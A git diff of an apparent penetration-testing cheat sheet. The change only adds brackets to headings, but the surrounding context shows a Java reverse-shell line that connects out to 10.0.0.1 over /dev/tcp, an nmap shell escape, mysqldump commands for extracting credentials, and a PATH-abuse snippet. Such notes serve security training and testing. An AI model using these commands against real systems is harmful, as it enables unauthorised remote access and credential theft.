@@ -76,7 +76,7 @@ exec "/bin/sh"
 (From within nmap)
 !sh
 ```
-## reverse TCP Shell's
+## [reverse TCP Shell's]
 
 #### bash
 ```
@@ -120,7 +120,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
-### SCP Transfer
+### [SCP Transfer]
 ```
 Local to Remote
 scp file.txt username@IP:/remote/directory
@@ -137,7 +137,7 @@ scp -r foldername username@IP:/local/directory
 (Specify Port)
 scp -P 2222 file username@IP:/local/directory
 ```
-### Extracting Creds from mysql using mysqldump util
+### [Extracting Creds from mysql using mysqldump util]
 ```
 Local
 mysqldump -u mysql_username -ppassword Database_Name
@@ -148,7 +148,7 @@ mysqldump -h IP -P PORT -u mysql_username -ppassword Database_Name
 mysqldump -h IP -P PORT -u mysql_username -ppassword Database_Name Table_Name
 ```
 
-### Abusing PATH
+### [Abusing PATH]
 ```
 export PATH=$PATH:/location/to/redirect/execution
 ```
